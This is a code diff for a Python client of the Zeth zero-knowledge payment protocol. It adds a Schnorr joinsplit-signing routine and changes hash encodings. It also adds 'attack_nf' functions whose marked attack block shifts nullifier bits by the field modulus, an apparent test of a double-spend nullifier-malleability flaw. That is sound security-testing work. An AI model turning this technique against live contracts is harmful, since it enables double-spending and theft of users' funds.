@@ -2,8 +2,8 @@ from __future__ import annotations
 import zeth.constants as constants
 import zeth.errors as errors
 from zeth.utils import get_trusted_setup_dir, hex_extend_32bytes, \
-    hex_digest_to_binary_string, string_list_flatten, encode_single, \
-    encode_abi, encrypt, decrypt, get_public_key_from_bytes
+    hex_digest_to_binary_string, encode_abi, encrypt, decrypt, \
+    get_public_key_from_bytes, encode_to_hash
 from zeth.prover_client import ProverClient
 from api.util_pb2 import ZethNote, JoinsplitInput, HexPointBaseGroup1Affine, \
     HexPointBaseGroup2Affine
@@ -17,7 +17,7 @@ import sys
 from Crypto import Random
 from hashlib import blake2s, sha256
 from py_ecc import bn128 as ec
-from typing import Tuple, Dict, List, Iterable, Union, Any
+from typing import Tuple, Dict, List, Iterable, Any
 
 
 FQ = ec.FQ
@@ -146,7 +146,7 @@ def compute_nullifier(zeth_note: ZethNote, spending_authority_ask: str) -> str:
     binary_ask = hex_digest_to_binary_string(spending_authority_ask)
     first_252bits_ask = binary_ask[:252]
     left_leg_bin = "1110" + first_252bits_ask
-    left_leg_hex = "{0:0>4X}".format(int(left_leg_bin, 2))
+    left_leg_hex = "{0:0>64X}".format(int(left_leg_bin, 2))
     nullifier = blake2s(
         encode_abi(
             ["bytes32", "bytes32"],
@@ -169,7 +169,7 @@ def compute_rho_i(phi: str, hsig: str, i: int) -> str:
     binary_phi = hex_digest_to_binary_string(phi)
     first_252bits_phi = binary_phi[:252]
     left_leg_bin = "0" + str(i) + "10" + first_252bits_phi
-    left_leg_hex = "{0:0>4X}".format(int(left_leg_bin, 2))
+    left_leg_hex = "{0:0>64X}".format(int(left_leg_bin, 2))
 
     rho_i = blake2s(
         encode_abi(
@@ -186,7 +186,7 @@ def derive_apk(ask: str) -> str:
     binary_ask = hex_digest_to_binary_string(ask)
     first_252bits_ask = binary_ask[:252]
     left_leg_bin = "1100" + first_252bits_ask
-    left_leg_hex = "{0:0>4X}".format(int(left_leg_bin, 2))
+    left_leg_hex = "{0:0>64X}".format(int(left_leg_bin, 2))
     zeroes = "0000000000000000000000000000000000000000000000000000000000000000"
     apk = blake2s(
         encode_abi(
@@ -228,108 +228,12 @@ def gen_one_time_schnorr_vk_sk_pair() -> JoinsplitKeypair:
     return JoinsplitKeypair(x, y, X, Y)
 
 
-def encode_pub_input_to_hash(message_list: List[Union[str, List[str]]]) -> bytes:
-    """
-    Encode the primary inputs as defined in ZCash chapter 4.15.1 into a byte
-    array (https://github.com/zcash/zips/blob/master/protocol/protocol.pdf) The
-    root, nullifierS, commitmentS, h_sig and h_iS are encoded over two field
-    elements The public values are encoded over one field element
-    """
-    input_sha = bytearray()
-
-    # Flatten the input list
-    messages = string_list_flatten(message_list)
-
-    # Encode the given Merkle Tree root
-    root = hex_extend_32bytes(messages[0][2:])
-    root_encoded = encode_single("bytes32", bytes.fromhex(root))
-    input_sha += root_encoded
-
-    # Encode the given input nullifiers
-    for i in range(1, 1 + 2*(constants.JS_INPUTS), 2):
-        nf = field_elements_to_hex(messages[i], messages[i+1])
-        nf_encoded = encode_single("bytes32", bytes.fromhex(nf))
-        input_sha += nf_encoded
-
-    # Encode the given output commitments
-    for i in range(
-            1 + 2*(constants.JS_INPUTS),
-            1 + 2*(constants.JS_INPUTS + constants.JS_OUTPUTS), 2):
-        cm = field_elements_to_hex(messages[i], messages[i+1])
-        cm_encoded = encode_single("bytes32", bytes.fromhex(cm))
-        input_sha += cm_encoded
-
-    # Encode the public value in
-    v_in = messages[1 + 2*(constants.JS_INPUTS + constants.JS_OUTPUTS)][2:]
-    v_in = hex_extend_32bytes(v_in)
-    vin_encoded = encode_single("bytes32", bytes.fromhex(v_in))
-    input_sha += vin_encoded
-
-    # Encode the public value out
-    v_out = messages[1 + 2*(constants.JS_INPUTS + constants.JS_OUTPUTS) + 1][2:]
-    v_out = hex_extend_32bytes(v_out)
-    vout_encoded = encode_single("bytes32", bytes.fromhex(v_out))
-    input_sha += vout_encoded
-
-    # Encode the h_sig
-    hsig = field_elements_to_hex(
-        messages[1 + 2*(constants.JS_INPUTS + constants.JS_OUTPUTS) + 1 + 1],
-        messages[1 + 2*(constants.JS_INPUTS + constants.JS_OUTPUTS) + 1 + 1 + 1])
-    hsig_encoded = encode_single("bytes32", bytes.fromhex(hsig))
-    input_sha += hsig_encoded
-
-    # Encode the h_iS
-    for i in range(
-        1 + 2*(constants.JS_INPUTS + constants.JS_OUTPUTS + 1 + 1),
-        1 + 2*(constants.JS_INPUTS + constants.JS_OUTPUTS + 1 + 1 +
-               constants.JS_INPUTS),
-        2
-    ):
-        h_i = field_elements_to_hex(messages[i], messages[i+1])
-        h_i_encoded = encode_single("bytes32", bytes.fromhex(h_i))
-        input_sha += h_i_encoded
-
-    return input_sha
-
-
-def field_elements_to_hex(longfield: str, shortfield: str) -> str:
-    """
-    Encode a 256 bit array written over two field elements into a single 32
-    byte long hex
-
-    if A= x0 ... x255 and B = y0 ... y7, returns R = hex(x255 ... x3 || y7 y6 y5)
-    """
-    # Convert longfield into a 253 bit long array
-    long_bit = "{0:b}".format(int(longfield, 16))
-    if len(long_bit) > 253:
-        long_bit = long_bit[:253]
-    long_bit = "0"*(253-len(long_bit)) + long_bit
-
-    # Convert shortfield into a 3 bit long array
-    short_bit = "{0:b}".format(int(shortfield, 16))
-    if len(short_bit) < 3:
-        short_bit = "0"*(3-len(short_bit)) + short_bit
-
-    # Reverse the bit arrays
-    reversed_long = long_bit[::-1]
-    reversed_short = short_bit[::-1]
-
-    # Fill the result 256 bit long array
-    res = reversed_long[:253]
-    res += reversed_short[:3]
-    res = hex_extend_32bytes("{0:0>4X}".format(int(res, 2)))
-
-    return res
-
-
 def sign(
         keypair: JoinsplitKeypair,
-        hash_ciphers: str,
-        hash_proof: str,
-        hash_inputs: str) -> int:
+        hash_to_be_signed: str) -> int:
     """
-    Generate a Schnorr one-time signature of the ciphertexts, proofs and
-    primary inputs We chose to sign the hash of the proof for modularity (to
+    Generate a Schnorr signature on a hash.
+    We chose to sign the hash of the proof for modularity (to
     use the same code regardless of whether GROTH16 or PGHR13 proof system is
     chosen), and sign the hash of the ciphers and inputs for consistency.
     """
@@ -338,18 +242,16 @@ def sign(
     sk = keypair.sk
 
     # Format part of the public key as an hex
-    y0_hex = hex_extend_32bytes("{0:0>4X}".format(int(vk[1][0])))
-    y1_hex = hex_extend_32bytes("{0:0>4X}".format(int(vk[1][1])))
+    y0_hex = hex_extend_32bytes("{0:0>64X}".format(int(vk[1][0])))
+    y1_hex = hex_extend_32bytes("{0:0>64X}".format(int(vk[1][1])))
 
     # Encode and hash the verifying key and input hashes
     data_to_sign = encode_abi(
-        ["bytes32", "bytes32", "bytes32", "bytes32", "bytes32"],
+        ["bytes32", "bytes32", "bytes32"],
         [
             bytes.fromhex(y0_hex),
             bytes.fromhex(y1_hex),
-            bytes.fromhex(hash_ciphers),
-            bytes.fromhex(hash_proof),
-            bytes.fromhex(hash_inputs)
+            bytes.fromhex(hash_to_be_signed)
         ]
     )
     data_hex = sha256(data_to_sign).hexdigest()
@@ -361,6 +263,42 @@ def sign(
     sigma = sk[1].n + h * sk[0].n % constants.ZETH_PRIME
 
     return sigma
+
+
+def sign_joinsplit(
+        joinsplit_keypair: JoinsplitKeypair,
+        pk_sender: bytes,
+        ciphertexts: List[bytes],
+        proof_json: Dict[str, Any]) -> int:
+    """
+    Generate a Schnorr signature on the hash of the ciphertexts, proofs
+    and primary inputs. This is used to solve transaction malleability.
+    """
+
+    # Hashing all inputs of the signature
+    # Encode the ciphertexts and ephemeral encryption key
+    data_to_be_signed = pk_sender
+
+    for cipher in ciphertexts:
+        data_to_be_signed += cipher
+
+    # Encode the proof
+    proof: List[str] = []
+    for key in proof_json.keys():
+        if key != "inputs":
+            proof.extend(proof_json[key])
+    data_to_be_signed += encode_to_hash(proof)
+
+    # Encode the primary inputs
+    data_to_be_signed += encode_to_hash(proof_json["inputs"])
+
+    # Hash data_to_be_sign
+    hash_to_be_sign = sha256(data_to_be_signed).hexdigest()
+
+    # Compute the joinSplit signature
+    joinsplit_sig = sign(joinsplit_keypair, hash_to_be_sign)
+
+    return joinsplit_sig
 
 
 def parse_verification_key_pghr13(
@@ -475,9 +413,7 @@ def compute_joinsplit2x2_inputs(
             mk_path1, input_address1, input_note1, sender_ask, input_nullifier1)
     ]
 
-    random_seed = _signature_randomness()
     h_sig = _compute_h_sig(
-        random_seed,
         input_nullifier0,
         input_nullifier1,
         joinsplit_vk)
@@ -497,6 +433,91 @@ def compute_joinsplit2x2_inputs(
         output_note1
     ]
 
+    return prover_pb2.ProofInputs(
+        mk_root=mk_root,
+        js_inputs=js_inputs,
+        js_outputs=js_outputs,
+        pub_in_value=public_in_value,
+        pub_out_value=public_out_value,
+        h_sig=h_sig,
+        phi=phi)
+
+
+def compute_joinsplit2x2_inputs_attack_nf(
+        mk_root: str,
+        input_note0: ZethNote,
+        input_address0: int,
+        mk_path0: List[str],
+        input_note1: ZethNote,
+        input_address1: int,
+        mk_path1: List[str],
+        sender_ask: str,
+        recipient0_apk: str,
+        recipient1_apk: str,
+        output_note_value0: str,
+        output_note_value1: str,
+        public_in_value: str,
+        public_out_value: str,
+        joinsplit_vk: JoinsplitPublicKey) -> prover_pb2.ProofInputs:
+    """
+    Create a ProofInput object for joinsplit parameters
+    """
+    input_nullifier0 = compute_nullifier(input_note0, sender_ask)
+    input_nullifier1 = compute_nullifier(input_note1, sender_ask)
+
+    js_inputs = [
+        create_joinsplit_input(
+            mk_path0, input_address0, input_note0, sender_ask, input_nullifier0),
+        create_joinsplit_input(
+            mk_path1, input_address1, input_note1, sender_ask, input_nullifier1)
+    ]
+
+    # ### ATTACK BLOCK
+    # Add $r$ to nullifiers so that they have the same value in Z_p
+    # but different ones in {0;1}^256
+    # See: https://github.com/clearmatics/zeth/issues/38
+    r = 21888242871839275222246405745257275088548364400416034343698204186575808495617  # noqa
+
+    # We disassemble the nfs to get the formatting of the primary inputs
+    nf0_rev = "{0:0256b}".format(int(input_nullifier0, 16))[::-1]
+    primary_input1_bits = nf0_rev[3:]
+    primary_input2_bits = nf0_rev[:3]
+    nf1_rev = "{0:0256b}".format(int(input_nullifier1, 16))[::-1]
+    primary_input3_bits = nf1_rev[3:]
+    primary_input4_bits = nf1_rev[:3]
+
+    # We perform the attack
+    attack_primary_input2 = int(primary_input2_bits, 2) + r
+    attack_primary_input4 = int(primary_input4_bits, 2) + r
+
+    # We reassemble the nfs
+    attack_primary_input2_bits = "{0:0256b}".format(attack_primary_input2)
+    attack_nf0_bits = attack_primary_input2_bits[256-3:] + primary_input1_bits
+    attack_nf0 = "{0:064x}".format(int(attack_nf0_bits[::-1], 2))
+    attack_primary_input4_bits = "{0:0256b}".format(attack_primary_input4)
+    attack_nf1_bits = attack_primary_input4_bits[256-3:] + primary_input3_bits
+    attack_nf1 = "{0:064x}".format(int(attack_nf1_bits[::-1], 2))
+    # ### ATTACK BLOCK
+
+    h_sig = _compute_h_sig(
+        attack_nf0,
+        attack_nf1,
+        joinsplit_vk)
+    phi = _transaction_randomness()
+
+    output_note0, output_note1 = create_zeth_notes(
+        phi,
+        h_sig,
+        recipient0_apk,
+        output_note_value0,
+        recipient1_apk,
+        output_note_value1
+    )
+
+    js_outputs = [
+        output_note0,
+        output_note1
+    ]
     return prover_pb2.ProofInputs(
         mk_root=mk_root,
         js_inputs=js_inputs,
@@ -531,6 +552,57 @@ def get_proof_joinsplit_2_by_2(
     """
     joinsplit_keypair = gen_one_time_schnorr_vk_sk_pair()
     proof_input = compute_joinsplit2x2_inputs(
+        mk_root,
+        input_note0,
+        input_address0,
+        mk_path0,
+        input_note1,
+        input_address1,
+        mk_path1,
+        sender_ask,
+        recipient0_apk,
+        recipient1_apk,
+        output_note_value0,
+        output_note_value1,
+        public_in_value,
+        public_out_value,
+        joinsplit_keypair.vk)
+    proof_obj = prover_client.get_proof(proof_input)
+    proof_json = parse_proof(proof_obj, zksnark)
+
+    # We return the zeth notes to be able to spend them later
+    # and the proof used to create them
+    return (
+        proof_input.js_outputs[0],  # pylint: disable=no-member
+        proof_input.js_outputs[1],  # pylint: disable=no-member
+        proof_json,
+        joinsplit_keypair)
+
+
+def get_proof_joinsplit_2_by_2_attack_nf(
+        prover_client: ProverClient,
+        mk_root: str,
+        input_note0: ZethNote,
+        input_address0: int,
+        mk_path0: List[str],
+        input_note1: ZethNote,
+        input_address1: int,
+        mk_path1: List[str],
+        sender_ask: str,
+        recipient0_apk: str,
+        recipient1_apk: str,
+        output_note_value0: str,
+        output_note_value1: str,
+        public_in_value: str,
+        public_out_value: str,
+        zksnark: str
+) -> Tuple[ZethNote, ZethNote, Dict[str, Any], JoinsplitKeypair]:
+    """
+    Query the prover server to generate a proof for the given joinsplit
+    parameters.
+    """
+    joinsplit_keypair = gen_one_time_schnorr_vk_sk_pair()
+    proof_input = compute_joinsplit2x2_inputs_attack_nf(
         mk_root,
         input_note0,
         input_address0,
@@ -597,7 +669,6 @@ def receive_notes(
 
 
 def _compute_h_sig(
-        random_seed: bytes,
         nf0: str,
         nf1: str,
         joinsplit_pub_key: JoinsplitPublicKey) -> str:
@@ -605,25 +676,28 @@ def _compute_h_sig(
     Compute h_sig = blake2s(randomSeed, nf0, nf1, joinSplitPubKey)
     Flatten the verification key
     """
+
     js_pub_key_hex = [item for sublist in joinsplit_pub_key for item in sublist]
 
-    vk_hex = ""
+    vk_hex = []
     for item in js_pub_key_hex:
         # For each element of the list, convert it to an hex and append it
-        vk_hex += hex_extend_32bytes("{0:0>4X}".format(int(item)))
+        vk_hex.append(hex_extend_32bytes("{0:0>64X}".format(int(item))))
 
-    h_sig = blake2s(
+    h_sig = sha256(
         encode_abi(
-            ['bytes32', 'bytes32', 'bytes32', 'bytes'],
+            ['bytes32', 'bytes32',
+             'bytes32', 'bytes32', 'bytes32', 'bytes32'],
             [
-                random_seed,
                 bytes.fromhex(nf0),
                 bytes.fromhex(nf1),
-                bytes.fromhex(vk_hex)
+                bytes.fromhex(vk_hex[0]),
+                bytes.fromhex(vk_hex[1]),
+                bytes.fromhex(vk_hex[2]),
+                bytes.fromhex(vk_hex[3])
             ]
         )
     ).hexdigest()
-
     return h_sig
 
 
